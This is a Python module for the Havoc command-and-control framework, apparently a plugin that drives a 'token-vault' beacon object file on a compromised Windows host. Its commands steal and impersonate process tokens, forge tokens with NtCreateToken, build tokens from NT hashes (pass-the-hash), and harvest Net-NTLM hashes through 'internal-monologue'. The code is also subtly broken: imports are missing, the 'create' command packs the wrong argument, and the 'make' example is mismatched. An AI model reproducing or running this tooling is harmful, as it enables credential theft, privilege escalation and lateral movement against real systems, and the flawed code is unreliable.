from havoc import Demon, RegisterCommand, RegisterModule

BOF_PATH = "./bin/token-vault.x64.o"

class Packer:
    def __init__(self):
        self.buffer: bytes = b''
        self.size: int = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addstr(self, s):
        if s is None:
            s = ''
        if isinstance(s, str):
            s = s.encode("utf-8")
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s) + 1, s)
        self.size += calcsize(fmt)

    def addint(self, dint):
        self.buffer += pack("<i", dint)
        self.size += 4


def list(demon_id, *args):
    packer: Packer = Packer()

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) != 0:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "this command does not take any argument")
        return False

    # Add the arguments to the packer
    packer.addstr("list")

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")

    demon.InlineExecute(task_id, "go", BOF_PATH, packer.getbuffer(), False)

    return task_id

def steal(demon_id, *args):
    packer: Packer = Packer()

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) != 1:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Incorrect number of arguments")
        return False

    # Add the arguments to the packer
    packer.addstr("steal")
    packer.addint(int(args[0]))

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")

    demon.InlineExecute(task_id, "go", BOF_PATH, packer.getbuffer(), False)

    return task_id

def impersonate(demon_id, *args):
    packer: Packer = Packer()

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) != 1:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Incorrect number of arguments")
        return False

    # Add the arguments to the packer
    packer.addstr("impersonate")
    packer.addint(int(args[0]))

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")

    demon.InlineExecute(task_id, "go", BOF_PATH, packer.getbuffer(), False)

    return task_id

def remove(demon_id, *args):
    packer: Packer = Packer()

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) != 1:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Incorrect number of arguments")
        return False

    # Add the arguments to the packer
    packer.addstr("remove")
    packer.addint(int(args[0]))

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")

    demon.InlineExecute(task_id, "go", BOF_PATH, packer.getbuffer(), False)

    return task_id

def revert(demon_id, *args):
    packer: Packer = Packer()

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) != 0:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Incorrect number of arguments")
        return False

    # Add the arguments to the packer
    packer.addstr("revert")

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")

    demon.InlineExecute(task_id, "go", BOF_PATH, packer.getbuffer(), False)

    return task_id

def getuid(demon_id, *args):
    packer: Packer = Packer()

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) != 0:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Incorrect number of arguments")
        return False

    # Add the arguments to the packer
    packer.addstr("getuid")

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")

    demon.InlineExecute(task_id, "go", BOF_PATH, packer.getbuffer(), False)

    return task_id

def make_pth(demon_id, *args):
    packer: Packer = Packer()

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) != 3:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Incorrect number of arguments")
        return False

    if len(args[2]) != 32:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Incorrect nt hash length")
        return False

    # Add the arguments to the packer
    packer.addstr("make_pth")
    packer.addstr(args[0])
    packer.addstr(args[1])
    packer.addstr(args[2])

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")

    demon.InlineExecute(task_id, "go", BOF_PATH, packer.getbuffer(), False)

    return task_id

def make(demon_id, *args):
    packer: Packer = Packer()

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) not in [3, 4]:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Incorrect number of arguments")
        return False

    # Add the arguments to the packer
    packer.addstr("make")
    packer.addstr(args[0])
    packer.addstr(args[1])
    packer.addstr(args[2])

    # check the logon type
    if len(args) == 4:

        if args[3].upper() not in [
            "BATCH",
            "INTERACTIVE",
            "NETWORK",
            "NETWORK_CLEARTEXT",
            "NEW_CREDENTIALS",
            "SERVICE",
            "UNLOCK"
        ]:
            demon.ConsoleWrite(demon.CONSOLE_ERROR, "Invalid logon type")
            return False

        packer.addstr(args[3].upper())

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")

    demon.InlineExecute(task_id, "go", BOF_PATH, packer.getbuffer(), False)

    return task_id

def info(demon_id, *args):
    packer: Packer = Packer()

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) > 1:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Incorrect number of arguments")
        return False

    # Add the arguments to the packer
    packer.addstr("info")

    if len(args) == 1:
        packer.addint(int(args[0]))

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")

    demon.InlineExecute(task_id, "go", BOF_PATH, packer.getbuffer(), False)

    return task_id

def create(demon_id, *args):
    packer: Packer = Packer()

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) != 3:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Incorrect number of arguments")
        return False

    # check the privs are valid
    for priv in args[2].upper().split(","):
        if priv not in [
            "SECREATETOKENPRIVILEGE",
            "SEASSIGNPRIMARYTOKENPRIVILEGE",
            "SELOCKMEMORYPRIVILEGE",
            "SEINCREASEQUOTAPRIVILEGE",
            "SEMACHINEACCOUNTPRIVILEGE",
            "SETCBPRIVILEGE",
            "SESECURITYPRIVILEGE",
            "SETAKEOWNERSHIPPRIVILEGE",
            "SELOADDRIVERPRIVILEGE",
            "SESYSTEMPROFILEPRIVILEGE",
            "SESYSTEMTIMEPRIVILEGE",
            "SEPROFSINGLEPROCESSPRIVILEGE",
            "SEINCBASEPRIORITYPRIVILEGE",
            "SECREATEPAGEFILEPRIVILEGE",
            "SECREATEPERMANENTPRIVILEGE",
            "SEBACKUPPRIVILEGE",
            "SERESTOREPRIVILEGE",
            "SESHUTDOWNPRIVILEGE",
            "SEDEBUGPRIVILEGE",
            "SEAUDITPRIVILEGE",
            "SESYSTEMENVIRONMENTPRIVILEGE",
            "SECHANGENOTIFYPRIVILEGE",
            "SEREMOTESHUTDOWNPRIVILEGE",
            "SEUNDOCKPRIVILEGE",
            "SESYNCAGENTPRIVILEGE",
            "SEENABLEDELEGATIONPRIVILEGE",
            "SEMANAGEVOLUMEPRIVILEGE",
            "SEIMPERSONATEPRIVILEGE",
            "SECREATEGLOBALPRIVILEGE",
            "SETRUSTEDCREDMANACCESSPRIVILEGE",
            "SERELABELPRIVILEGE",
            "SEINCWORKINGSETPRIVILEGE",
            "SETIMEZONEPRIVILEGE",
            "SECREATESYMBOLICLINKPRIVILEGE",
            "SEDELEGATESESSIONUSERIMPERSONATEPRIVILEGE",
        ]:
            demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Invalid privilege: {priv}")
            return False

    # Add the arguments to the packer
    packer.addstr("create")
    packer.addstr(args[0])
    packer.addstr(args[1])
    packer.addstr(args[1].upper())

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")

    demon.InlineExecute(task_id, "go", BOF_PATH, packer.getbuffer(), False)

    return task_id

def internal_monologue(demon_id, *args):
    packer: Packer = Packer()

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) != 0:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Incorrect number of arguments")
        return False

    # Add the arguments to the packer
    packer.addstr("internal-monologue")

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")

    demon.InlineExecute(task_id, "go", BOF_PATH, packer.getbuffer(), False)

    return task_id

RegisterModule("token-vault", "just another token vault", "", "[command] (args)", "", "")
RegisterCommand(create, "token-vault", "create", "create a token using NtCreateToken, requires SeCreateTokenPrivilege. This privilege can either be obtained by stealing lsass' token or by changing the privilege of an account, to do so use my other BOF sammy ;)", 0,
                "<username> <groups> <privs>", "niozow Administrators SeDebugPrivilege,SeCreateTokenPrivilege")
RegisterCommand(list, "token-vault", "list", "list the available tokens of the token-vault", 0,
                "", "")
RegisterCommand(steal, "token-vault", "steal", "steal the token of a process", 0,
                "<pid>", "663")
RegisterCommand(impersonate, "token-vault", "impersonate", "impersonate a token", 0,
                "<id>", "1")
RegisterCommand(remove, "token-vault", "remove", "remove a token from the vault", 0,
                "<id>", "1")
RegisterCommand(revert, "token-vault", "revert", "revert to the original token", 0,
                "", "")
RegisterCommand(getuid, "token-vault", "getuid", "get the user of the token", 0,
                "", "")
RegisterCommand(make_pth, "token-vault", "make_pth", "create a token as a user using its nt hash", 0,
                "<username> <domain> <nt hash>", "niozow domain.local 7facdc498ed1680c4fd1448319a8c04f")
RegisterCommand(make, "token-vault", "make", "create a token as a user using its password", 0,
                "<username> <domain> <password> (LogonType)\nValid logon types are:\nBATCH\nINTERACTIVE (default)\nNETWORK\nNETWORK_CLEARTEXT\nNEW_CREDENTIALS\nSERVICE\nUNLOCK",
                "niozow domain.local 7facdc498ed1680c4fd1448319a8c04f")
RegisterCommand(info, "token-vault", "info", "get info about the current token or one by id", 0,
                "(id)", "")
RegisterCommand(internal_monologue, "token-vault", "internal-monologue", "get a Net-NTLM hash of the user of the current token", 0,
                "(id)", "")
